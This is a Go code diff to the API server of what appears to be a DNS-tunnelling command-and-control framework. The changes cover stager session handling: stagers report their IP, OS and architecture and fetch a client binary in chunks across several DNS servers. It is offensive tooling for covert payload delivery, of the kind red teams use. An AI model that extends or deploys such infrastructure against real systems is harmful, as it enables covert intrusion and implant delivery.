@@ -2679,18 +2679,9 @@ func (api *APIServer) handleStagerInit(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 
-	// Queue cache task for all DNS servers (they'll get it on next checkin)
-	err = api.db.QueueStagerCacheForDNSServers(clientBinaryID, dnsServerIDs)
-	if err != nil {
-		// Log but don't fail - stager will still work via on-demand caching
-		fmt.Printf("[API] Failed to queue cache tasks: %v\n", err)
-	} else {
-		fmt.Printf("[API] Queued stager cache for %d DNS servers\n", len(dnsServerIDs))
-	}
-
 	// Always log stager session creation (not just in debug mode)
 	fmt.Printf("[API] Stager session created: %s | Stager: %s (%s/%s) | Chunks: %d across %d DNS servers\n",
-		sessionID[:16], req.StagerIP, req.OS, req.Arch, totalChunks, len(dnsServerIDs))
+		sessionID, req.StagerIP, req.OS, req.Arch, totalChunks, len(dnsServerIDs))
 
 	if api.config.Debug {
 		fmt.Printf("[API] DNS domains available: %v\n", dnsDomains)
@@ -2780,6 +2771,7 @@ type StagerContactRequest struct {
 	StagerIP       string `json:"stager_ip"`
 	OS             string `json:"os"`
 	Arch           string `json:"arch"`
+	TotalChunks    int    `json:"total_chunks,omitempty"`
 }
 
 // StagerProgressRequest represents a progress report from DNS server
@@ -2828,16 +2820,18 @@ func (api *APIServer) handleStagerContact(w http.ResponseWriter, r *http.Request
 	// This ensures all DNS servers use the same session ID for the same stager
 	sessionID := generateDeterministicStagerSessionID(req.StagerIP, req.ClientBinaryID)
 
-	// Get total chunks from the cached binary
-	chunkCount, err := api.db.GetCachedChunkCount(req.ClientBinaryID)
-	if err != nil {
-		// If we can't get chunk count, log warning but continue
-		fmt.Printf("[API] Warning: Could not get chunk count for cached binary %s: %v\n", req.ClientBinaryID, err)
-		chunkCount = 0 // Will be updated as chunks are served
+	// Get total chunks - use request value first, fallback to database lookup
+	chunkCount := req.TotalChunks
+	if chunkCount == 0 {
+		var err error
+		chunkCount, err = api.db.GetCachedChunkCount(req.ClientBinaryID)
+		if err != nil {
+			fmt.Printf("[API] Warning: Could not get chunk count for cached binary %s: %v\n", req.ClientBinaryID, err)
+		}
 	}
 
 	// Create stager session in database for UI tracking
-	err = api.db.CreateStagerSession(
+	err := api.db.CreateStagerSession(
 		sessionID,
 		req.StagerIP,
 		req.OS,
